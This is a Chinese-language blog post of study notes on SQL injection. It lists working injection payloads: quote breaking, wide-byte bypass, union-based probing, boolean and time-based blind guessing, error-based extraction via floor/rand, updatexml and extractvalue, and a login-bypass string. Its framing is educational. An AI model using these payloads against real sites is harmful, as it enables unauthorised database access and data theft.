href="#%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7"><span class="nav-number">7.2.2.2.</span> <span class="nav-text">系统用户</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1"><span class="nav-number">7.2.3.</span> <span class="nav-text">获取操作系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%B1%E5%BA%93-2"><span class="nav-number">7.3.</span> <span class="nav-text">脱库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-3"><span class="nav-number">7.3.1.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D-2"><span class="nav-number">7.3.2.</span> <span class="nav-text">获取数据表名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%A1%A8%E5%90%8D"><span class="nav-number">7.3.2.1.</span> <span class="nav-text">获取当前表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E8%A1%A8%E5%90%8D"><span class="nav-number">7.3.2.2.</span> <span class="nav-text">获取其他表名</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-2"><span class="nav-number">7.3.3.</span> <span class="nav-text">获取字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE-2"><span class="nav-number">7.3.4.</span> <span class="nav-text">获取数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">8.</span> <span class="nav-text">Oracle渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-4"><span class="nav-number">8.1.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%B8%AA%E6%95%B0%E6%B5%8B%E8%AF%95-3"><span class="nav-number">8.1.1.</span> <span class="nav-text">注入点个数测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE%E6%B5%8B%E8%AF%95-3"><span class="nav-number">8.1.2.</span> <span class="nav-text">注入点位置测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%B1%E5%BA%93-3"><span class="nav-number">8.2.</span> <span class="nav-text">脱库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D-3"><span class="nav-number">8.2.1.</span> <span class="nav-text">获取数据表名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%86%E7%A1%AE%E6%9F%A5%E8%AF%A2"><span class="nav-number">8.2.1.1.</span> <span class="nav-text">准确查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2"><span class="nav-number">8.2.1.2.</span> <span class="nav-text">模糊查询</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-3"><span class="nav-number">8.2.2.</span> <span class="nav-text">获取字段名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%86%E7%A1%AE"><span class="nav-number">8.2.2.1.</span> <span class="nav-text">准确</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE-3"><span class="nav-number">8.2.3.</span> <span class="nav-text">获取数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">9.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%88%90"><span class="nav-number">10.</span> <span class="nav-text">完成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">11.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="57uv6Z6g"
      src="/assets/images/avatar.gif">
  <p class="site-author-name" itemprop="name">57uv6Z6g</p>
  <div class="site-description" itemprop="description">5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="mailto:00-isomer-cabbies@icloud.com" title="E-Mail → mailto:00-isomer-cabbies@icloud.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://t.me/LittleSweetCookie" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;LittleSweetCookie" rel="noopener me" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
      </span>
  </div>

<div id="aplayer-app"></div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://loli.fj.cn/2020/03/27/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/assets/images/avatar.gif">
      <meta itemprop="name" content="57uv6Z6g">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="【笔记】SQL注入攻击 | 57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【笔记】SQL注入攻击
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-03-27 23:46:23" itemprop="dateCreated datePublished" datetime="2020-03-27T23:46:23+08:00">2020-03-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-25 15:39:44" itemprop="dateModified" datetime="2025-10-25T15:39:44+08:00">2025-10-25</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入（英语：SQL injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而执行，因此遭到破坏或是入侵。（<a href="/302.html?target=https://zh.wikipedia.org/zh-cn/SQL%E6%B3%A8%E5%85%A5">维基百科</a>）</p>
<span id="more"></span>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul>
<li>在请求参数中携带恶意SQL代码，服务器端接收到SQL语句后，将恶意SQL语句执行，从而实现SQL注入攻击</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="根据数据类型分类"><a href="#根据数据类型分类" class="headerlink" title="根据数据类型分类"></a>根据数据类型分类</h3><ul>
<li>数字型SQL注入<ul>
<li>在注入时不需要考虑引号的闭合问题</li>
</ul>
</li>
<li>字符型SQL注入<ul>
<li>在注入时需要考虑引号的闭合问题</li>
</ul>
</li>
</ul>
<h3 id="根据注入手法的分类"><a href="#根据注入手法的分类" class="headerlink" title="根据注入手法的分类"></a>根据注入手法的分类</h3><ul>
<li>UNION query SQL injection 联合查询（针对查操作）</li>
<li>Error-based SQL injection 报错注入（针对查操作）</li>
<li>Boolean-based blind SQL injection 布尔盲注（针对查操作）</li>
<li>Time-based blind SQL injection 延时注入（针对查操作）</li>
<li>Stacked queries SQL injection 堆叠查询（针对增删改操作）</li>
</ul>
<h3 id="根据注入原理的分类（GPC）"><a href="#根据注入原理的分类（GPC）" class="headerlink" title="根据注入原理的分类（GPC）"></a>根据注入原理的分类（GPC）</h3><ul>
<li>GET数据</li>
<li>POST数据</li>
<li>Cookie数据</li>
</ul>
<h3 id="注入点位置"><a href="#注入点位置" class="headerlink" title="注入点位置"></a>注入点位置</h3><ul>
<li>注入点：可以拼接SQL语句的位置</li>
<li><code>*</code>作为注入点位置标识</li>
</ul>
<h4 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h4><ul>
<li>GET请求通过param参数或path参数注入</li>
</ul>
<figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/api/item?id=99*</span><br></pre></td></tr></table></figure>

<ul>
<li>POST请求通过body参数注入</li>
</ul>
<figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:80/api/item</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">id=99*</span><br></pre></td></tr></table></figure>

<h4 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h4><h5 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h5><ul>
<li>部分后端程序通过潘定请求头中的<code>X-Forward-For</code>参数来判定失败的登录次数，如果这个次数存储在了数据库中，则可以使用<code>X-Forward-For</code>作为注入点</li>
</ul>
<figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1:80/api/item?id=99</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1*</span><br></pre></td></tr></table></figure>

<h3 id="数据类型测试"><a href="#数据类型测试" class="headerlink" title="数据类型测试"></a>数据类型测试</h3><ul>
<li>操作：根据报错信息，判断1在数据库中存储时的数据类型</li>
<li>结论：当出现形如<code>&#39;&#39;&#39;</code>的报错信息时，判断该数字是以<strong>数值型</strong>数据存储在数据库中；当出现形如<code>&#39;1&#39;&#39;</code>的报错信息时，判断该数字是以<strong>字符型</strong>数据存储在数据库中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="打断测试"><a href="#打断测试" class="headerlink" title="打断测试"></a>打断测试</h3><ul>
<li>操作：如果成对的括号被中断，同时使用注释打断后面的语句，就可以实现sql语句的控制</li>
<li>原理：php中定义sql语句时，会使用括号进行包裹从而定义sql语句为字符串</li>
</ul>
<blockquote>
<p><code>&#39;</code>用来打断被引号引起来的内容</p>
<blockquote>
<p><code>&#39;</code>、<code>&quot;</code>、<code>)</code>、<code>]</code>、<code>&#125;</code>、<code>\</code>、<code>/</code>、<code>,</code>、<code>.</code></p>
</blockquote>
<p><code>-- </code>用来打断后面的SQL语句</p>
<blockquote>
<p><code>#</code>（需要进行url编码）、<code>--</code></p>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; -- 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) -- 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;] -- 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;&#125; -- 1</span><br></pre></td></tr></table></figure>

<h4 id="宽字节测试"><a href="#宽字节测试" class="headerlink" title="宽字节测试"></a>宽字节测试</h4><ul>
<li>如果后端对<code>&#39;</code>进行了<code>\</code>转译，如果直接传递<code>?id=1&#39;</code>，实际上后端得到的是<code>?id=1\&#39;</code>，所以可以采用宽子节测试</li>
<li>PHP中如果开启了<code>magic_quotes_gpc</code>则会触发<code>\</code>转译</li>
<li>PHP中如果使用了<code>addslashes()</code>函数则会触发<code>\</code>转译</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; -- 1</span><br></pre></td></tr></table></figure>

<h3 id="注入手法测试"><a href="#注入手法测试" class="headerlink" title="注入手法测试"></a>注入手法测试</h3><ul>
<li>通过传递不同的参数，判断页面加载，测试出可以使用哪种手法注入</li>
<li>只要可以使用任意一种注入手法，就可以断定存在SQL注入漏洞</li>
</ul>
<h4 id="注入点存在测试"><a href="#注入点存在测试" class="headerlink" title="注入点存在测试"></a>注入点存在测试</h4><ul>
<li>操作：多次传递不同的数值判断页面是否有变化</li>
<li>原理：如果<code>id=</code>任何一个数，页面能被动态渲染不同的数据，说明参数变量传递成功，注入点存在</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">?id=2</span><br></pre></td></tr></table></figure>

<h5 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h5><ul>
<li>如果页面有变化，可以使用联合查询注入</li>
<li>如果页面没有变化，继续判断布尔测试结果</li>
</ul>
<h4 id="布尔测试"><a href="#布尔测试" class="headerlink" title="布尔测试"></a>布尔测试</h4><ul>
<li>操作：通过两次传递能返回布尔值的语句，判断页面是否报错</li>
<li>原理：如果两次传递能返回布尔值的语句，发现页面不同，说明返回布尔值执行成功</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure>

<ul>
<li>测试结论<ul>
<li>如果有报错，可以使用报错注入</li>
<li>如果没有报错<ul>
<li>如果两次页面不同，可以使用布尔盲注</li>
<li>如果两次页面相同，继续判断延时测试结果</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="延时测试"><a href="#延时测试" class="headerlink" title="延时测试"></a>延时测试</h4><ul>
<li>操作：通过传递包含<code>sleep()</code>函数的语句，判断页面是否延时显示（通过开发者工具的网络选项查看）</li>
<li>原理：<code>sleep()</code>函数可以起到延时的效果，如果页面加载成功延时，说明<code>sleep()</code>函数执行成功</li>
</ul>
<blockquote>
<p><code>&lt;time&gt;</code>：指定延时时间</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and sleep(&lt;time&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li>测试结论<ul>
<li>如果有报错，可以使用报错注入</li>
<li>如果没有报错<ul>
<li>如果页面成功延时加载，可以使用延时注入</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="当代码中出现了编码"><a href="#当代码中出现了编码" class="headerlink" title="当代码中出现了编码"></a>当代码中出现了编码</h3><h4 id="如果是GBK编码"><a href="#如果是GBK编码" class="headerlink" title="如果是GBK编码"></a>如果是GBK编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%ff&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h4><ul>
<li>如果代码中出现了base64编码，需要重新将注入语句进行编码，然后再发送请求</li>
</ul>
<h2 id="MySQL渗透测试"><a href="#MySQL渗透测试" class="headerlink" title="MySQL渗透测试"></a>MySQL渗透测试</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><ul>
<li><p>原理：MySQL的<a href="/2019/12/15/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%EF%BC%88%E6%A8%A1%E6%8B%9F%EF%BC%89%E5%85%A8%E5%A4%96%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2">union</a>语句，实际上是用来去重取交集的，特点是可以指定一个查询语句与前面的查询语句进行组合，得到结果，但要求是前后两组sql语句得到的列数相同</p>
</li>
<li><p>可以通过<code>union</code>后面指定的查询语句，实现覆盖前面的查询语句，得到自己想要的字段的内容，展示在页面上</p>
</li>
<li><p>必要条件：两张虚拟的表具有相同的列数，虚拟表对应的列的数据类型相同</p>
<ul>
<li>数值型可以自动转换成字符串类型</li>
<li>不满足必要条件时，可以使用子查询语句</li>
</ul>
</li>
<li><p>基本语法</p>
</li>
</ul>
<blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select_1&gt; union &lt;select_2&gt;</span><br></pre></td></tr></table></figure>

<h4 id="注入点个数测试"><a href="#注入点个数测试" class="headerlink" title="注入点个数测试"></a>注入点个数测试</h4><ul>
<li>原理：MySQL的<a href="/2019/12/15/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E6%8E%92%E5%BA%8F">order by</a>语句，实际上是用来排序数据的，如果<code>order by</code>语句后有数字，表示根据第几个字段排序，当没有那个指定数量的字段时，会报错<ul>
<li>例如：<code>order by 2</code>，表示根据第2个字段进行数据的排序，如果没有第2个字段，则报错</li>
</ul>
</li>
<li>所以可以通过<code>order by</code>语句，得到字段数量临界值<ul>
<li>例如：从<code>order by 1</code>开始测试，当执行到<code>order by 3</code>时，页面报错，说明这个数据表只有2个字段，2就是临界值</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and order by 1</span><br><span class="line">?id=1 and order by 2</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以直接使用union语句测试注入点个数<ul>
<li>当<code>select 1,2,...</code>不再报错时，表示注入点个数测试完成</li>
</ul>
</li>
<li>将<code>id=1</code>改为其他不存在的id，这样才能展示union后面的select语句的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以使用布尔值为false的语句（例如<code>1=2</code>）强制让union前面的select报错，从而展示union后面的select语句的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,2</span><br></pre></td></tr></table></figure>

<h4 id="注入点位置测试"><a href="#注入点位置测试" class="headerlink" title="注入点位置测试"></a>注入点位置测试</h4><ul>
<li>在找到注入点个数后，可以开始注入点位置测试</li>
<li>通过查询数字1、数字2（根据注入点个数指定数字数量），在页面查看注入点的位置，如果有回显，则可以替换其他SQL语句用于查看查询结果</li>
<li>原理：当union前面的查询语句值为假，则后面的查询语句会被执行</li>
</ul>
<blockquote>
<p><code>1,2</code>：直接展示在页面上的内容（根据注入点个数指定数字数量）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="基于延时的盲注"><a href="#基于延时的盲注" class="headerlink" title="基于延时的盲注"></a>基于延时的盲注</h4><ul>
<li>盲猜敏感信息，利用<code>IF()</code>语句判断，将<code>SLEEP()</code>语句作为<code>IF()</code>语句的结果，通过判断页面是否延时加载，确定猜测是否正确</li>
</ul>
<h5 id="猜测数据库名长度"><a href="#猜测数据库名长度" class="headerlink" title="猜测数据库名长度"></a>猜测数据库名长度</h5><ul>
<li>如果猜对，延时5秒</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(length(database())=1,sleep(5),1)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果猜错，延时5秒</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if(length(database())=1,1,sleep(5))</span><br></pre></td></tr></table></figure>

<h4 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h4><ul>
<li>通过构建布尔值的判断，盲猜敏感信息</li>
<li>如果猜对则页面显示正常，如果猜错则页面显示不正常</li>
</ul>
<h5 id="猜测数据库名长度-1"><a href="#猜测数据库名长度-1" class="headerlink" title="猜测数据库名长度"></a>猜测数据库名长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and length(database())=1</span><br></pre></td></tr></table></figure>

<h5 id="猜测数据库名每个字符的ascii码"><a href="#猜测数据库名每个字符的ascii码" class="headerlink" title="猜测数据库名每个字符的ascii码"></a>猜测数据库名每个字符的ascii码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 第一个字符</span><br><span class="line">?id=1 and ascii(substr(database(), 1, 1))&gt;100</span><br><span class="line"></span><br><span class="line"># 第二个字符</span><br><span class="line">?id=1 and ascii(substr(database(), 2, 1))&gt;100</span><br><span class="line"></span><br><span class="line"># ...</span><br></pre></td></tr></table></figure>

<h4 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h4><ul>
<li>在报错的回显中，插入敏感信息</li>
<li>如果php中存在<code>die(mysql_error())</code>相关代码，则说明存在基于报错的盲注</li>
</ul>
<h5 id="重复键冲突报错"><a href="#重复键冲突报错" class="headerlink" title="重复键冲突报错"></a>重复键冲突报错</h5><ul>
<li>利用MySQL编号为#8652的bug，复现重复键冲突报错</li>
<li>这个漏洞存在一定几率</li>
</ul>
<blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1 from (select count(*),concat((&lt;select&gt;),floor(rand()*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select (concat(left(rand(),3),&#x27;^&#x27;,(&lt;select&gt;),&#x27;^&#x27;)a,count(*),3 from information_schema.tables group by a)</span><br></pre></td></tr></table></figure>

<h6 id="不同的SQL语句构造方式"><a href="#不同的SQL语句构造方式" class="headerlink" title="不同的SQL语句构造方式"></a>不同的SQL语句构造方式</h6><blockquote>
<p><code>&lt;select&gt;</code>：查询语句<br><code>&lt;select_field&gt;</code>：指定想要查询的字段</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="keyword">left</span>(rand(),<span class="number">3</span>),<span class="string">&#x27;^&#x27;</span>,(<span class="operator">&lt;</span><span class="keyword">select</span><span class="operator">&gt;</span>),<span class="string">&#x27;^&#x27;</span>) x,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果查询的表被禁用了，可以自己构建一个表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="string">&#x27;^&#x27;</span>,(<span class="operator">&lt;</span>select_field<span class="operator">&gt;</span>),<span class="string">&#x27;^&#x27;</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果rand()或count()被禁用了</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="number">1</span>) <span class="keyword">from</span> information_schema <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="string">&#x27;^&#x27;</span>,<span class="operator">&lt;</span>select_field<span class="operator">&gt;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>不依赖额外的函数和具体的表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> selecct <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>)a <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="string">&#x27;^&#x27;</span>,<span class="operator">&lt;</span>select_field<span class="operator">&gt;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h5 id="XPATH报错"><a href="#XPATH报错" class="headerlink" title="XPATH报错"></a>XPATH报错</h5><ul>
<li><code>0x7e</code>是占位符<code>~</code>的十六进制，用来分隔需要显示的查询结果</li>
<li><code>0x5e</code>是占位符<code>^</code>的十六进制，用来分隔需要显示的查询结果</li>
</ul>
<blockquote>
<p><code>&lt;select&gt;</code>：查询语句</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1, concat(0x7e, (&lt;select&gt;), 0x7e), 1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (&lt;select&gt;), 0x7e))</span><br></pre></td></tr></table></figure>

<h3 id="登录框注入"><a href="#登录框注入" class="headerlink" title="登录框注入"></a>登录框注入</h3><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><ul>
<li>输入任意密码，并构造一个结果为true布尔值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456&#x27; or 1=1</span><br></pre></td></tr></table></figure>

